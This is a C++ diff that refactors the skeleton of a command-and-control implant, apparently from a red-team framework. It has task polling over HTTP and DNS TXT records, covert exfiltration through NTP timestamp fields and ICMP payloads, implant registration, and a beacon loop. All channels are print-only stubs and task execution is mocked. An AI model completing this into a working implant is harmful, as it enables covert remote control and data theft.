@@ -1,111 +1,127 @@
-#include <iostream>
-#include <string>
-#include <vector>
-#include <map>
-#include "../data/msgpack/msgpack.h"
 #include "c2.h"
+#include "../protocols/json/json.h"
+#include "../data/msgpack/msgpack.h"
+// ======================================================================================
+// 0. STATIC MEMBER DEFINITIONS
+// ======================================================================================
+std::map<InMethod, IngressFunc> C2Implant::s_ingress_map;
+std::map<OutMethod, EgressFunc> C2Implant::s_egress_map;
+std::map<std::string, InMethod> C2Implant::s_in_resolver;
+std::map<std::string, OutMethod> C2Implant::s_out_resolver;
 
-// --- Strategies - aka funcs to call that do data (Jinja generates these) ex, http_get, etc. append profile name on them?? not sure. ---
 
-// Ingress: HTTP
-std::string get_HTTP() {
-    std::cout << "[HTTP GET] Checking for orders...\n";
-    return "exec_calc"; // Simulated command received
+// ======================================================================================
+// 2. STRATEGIES (Jinja Generated)
+// ======================================================================================
+
+// --- Ingress Strategies ---
+
+nlohmann::json get_HTTP(std::string implant_uuid) {
+    std::cout << "[HTTP GET] Checking for orders for UUID: " << implant_uuid << "...\n";
+    return nullptr; // No orders
+
 }
 
-std::string post_HTTP() {
-    std::cout << "[HTTP GET] Checking for orders...\n";
-    return "exec_calc"; // Simulated command received
-}
-
-// Ingress: DNS TXT Records
-std::string get_DNS() {
+nlohmann::json get_DNS(std::string implant_uuid) {
     std::cout << "[DNS TXT] Querying for orders...\n";
-    return ""; // No orders
+    return nullptr; // No orders
 }
 
-// Egress: NTP
-void post_NTP(std::string data) {
-    std::cout << "[NTP] Smuggling data inside timestamp fields: " << data << "\n";
+// --- Egress Strategies ---
+// Note: These must match EgressFunc signature: (uuid, text, task_id)
+
+void post_NTP(std::string implant_uuid, std::string text_data, std::string task_uuid) {
+    std::cout << "[NTP] Smuggling data inside timestamp fields.\n";
+    std::cout << "      ID: " << implant_uuid << " | Task: " << task_uuid << "\n";
+    std::cout << "      Data: " << text_data << "\n";
+
 }
-//
-// Egress: ICMP (Ping)
-void post_ICMP(std::string data) {
-    std::cout << "[ICMP] Packing data into ping payload: " << data << "\n";
+
+void post_ICMP(std::string implant_uuid, std::string text_data, std::string task_uuid) {
+    std::cout << "[ICMP] Packing data into ping payload: " << text_data << "\n";
 }
 
+// ======================================================================================
+// 3. CLASS IMPLEMENTATION
+// ======================================================================================
 
-// --- The Dispatcher ---
-class C2Implant {
-public:
-    static void init() {
-        // Jinja populates this
-        //settnig up mapping between which methods, and which funcs to call based on it
-        ingress_map_[InMethod::HTTP] = get_HTTP;
-        //ingressMap[InMethod::DNS] = get_DNS; //extra options
+//jinja this
+void C2Implant::init() {
+    // Mapping Enums to Functions
+    s_ingress_map[InMethod::HTTP] = get_HTTP;
+    s_ingress_map[InMethod::DNS] = get_DNS;
 
-        egress_map_[OutMethod::NTP] = post_NTP;
-        //egressMap[OutMethod::ICMP] = post_ICMP; //extra options
+    s_egress_map[OutMethod::NTP] = post_NTP;
+    s_egress_map[OutMethod::ICMP] = post_ICMP;
+
+    // Optional: Populate resolvers
+    // s_in_resolver["http"] = InMethod::HTTP;
+}
+
+int C2Implant::register_implant(InMethod registration_method) {
+    // Get the strategy
+    if (s_ingress_map.find(registration_method) == s_ingress_map.end()) {
+        std::cerr << "[-] Strategy not found for registration.\n";
+        return -1;
     }
 
-    //wrapper of funcs to call, easier to do this, and just pass in the map of funcs
-    static void cycle(InMethod get, OutMethod post) {
-        // 1. GET Command
-        while (1) {
-            nlohmann::json task_data = ingress_map_[get](implant_uuid_);
+    // Call strategy with "Zero UUID" for registration
+    nlohmann::json implant_uuid_data = s_ingress_map[registration_method]("00000000-0000-0000-0000-000000000000");
 
-            std::cout << "AFTER GET" << std::endl;
-
-            // [SAFETY CHECK] 
-            // 1. Is the JSON valid (not null)?
-            // 2. Does it contain the task_uuid key?
-            // 3. Is the value actually a string?
-            if (!task_data.is_null() && task_data.contains("task_uuid") && task_data["task_uuid"].is_string())
-            {
-                std::string task_uuid = task_data["task_uuid"];
-                std::cout << "Received Task: " << task_uuid << std::endl;
-
-                // Execute Actions
-                std::string text_data = "If you see this it means the implant is talking to you";
-
-                // Prepare Response
-                std::vector<uint8_t> task_response_as_msgpack;
-                create_task_response(implant_uuid_, task_uuid, text_data, task_response_as_msgpack);
-
-                // POST Response
-                //post(implant_uuid, text_data, task_uuid); // Note: verify if post needs text_data or the msgpack buffer
-                egress_map_[post](implant_uuid_, text_data, task_uuid);
-
-            }
-            else {
-                // This handles cases where:
-                // 1. HTTP_GET failed
-                // 2. Server sent "No Content"
-                std::cout << "No task or failed request. Sleeping..." << std::endl;
-            }
-
-            //sleep
-            this->sleep();
-        }
-    }
-
-    static int register_implant(InMethod registration_method) {
-        //get how we talk to server, send blank id
-        nlohmann::json implant_uuid_data = ingresss_map_[registration_method]("00000000-0000-0000-0000-000000000000");
-        
-        //extract implant_uuid from here, store in class var.
+    // 3. Extract UUID
+    if (implant_uuid_data.contains("implant_uuid")) {
         implant_uuid_ = implant_uuid_data["implant_uuid"];
-        std::cout << "Implant UUID: " << implant_uuid_ << std::endl;
-
-        if (implant_uuid.empty()) {
-            std::cerr << "Failed to register implant. Exiting." << std::endl;
-            return -1;
-        }
+        std::cout << "[+] Registered! Implant UUID: " << implant_uuid_ << std::endl;
         return 1;
     }
 
-    //Dedicated sleep func if people want to edit it
-    static void sleep() {
-        Sleep(5000);
+    std::cerr << "[-] Failed to register implant. Exiting." << std::endl;
+    return -1;
+}
+
+void C2Implant::cycle(InMethod get, OutMethod post) {
+    std::cout << "[*] Starting C2 Cycle Loop...\n";
+
+    while (true) {
+        // 1. Check for Strategy Existence
+        if (s_ingress_map.find(get) == s_ingress_map.end() || s_egress_map.find(post) == s_egress_map.end()) {
+            std::cerr << "[-] Invalid strategies selected.\n";
+            return;
+        }
+
+        // 2. GET Task
+        nlohmann::json task_data = s_ingress_map[get](implant_uuid_);
+
+        // 3. Validation
+        bool bIsValidTask = !task_data.is_null()
+            && task_data.contains("task_uuid")
+            && task_data["task_uuid"].is_string();
+
+        if (bIsValidTask) {
+            std::string task_uuid = task_data["task_uuid"];
+            std::cout << "[+] Received Task: " << task_uuid << std::endl;
+
+            // Execute Actions (Mocked)
+            std::string text_data = "If you see this it means the implant is talking to you";
+
+            // Prepare Response
+            std::vector<uint8_t> task_response_as_msgpack;
+            create_task_response(implant_uuid_, task_uuid, text_data, task_response_as_msgpack);
+
+            // POST Response
+            s_egress_map[post](implant_uuid_, text_data, task_uuid);
+        }
+        else {
+            std::cout << "[.] No task or empty response. Sleeping..." << std::endl;
+        }
+
+        // finally, Sleep
+        this->sleep_implant();
     }
-};
+}
+
+void C2Implant::sleep_implant() {
+    // Using standard cross-platform sleep for safety.
+    // Replace with Sleep(5000) if you specifically need the WinAPI hook.
+    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
+}
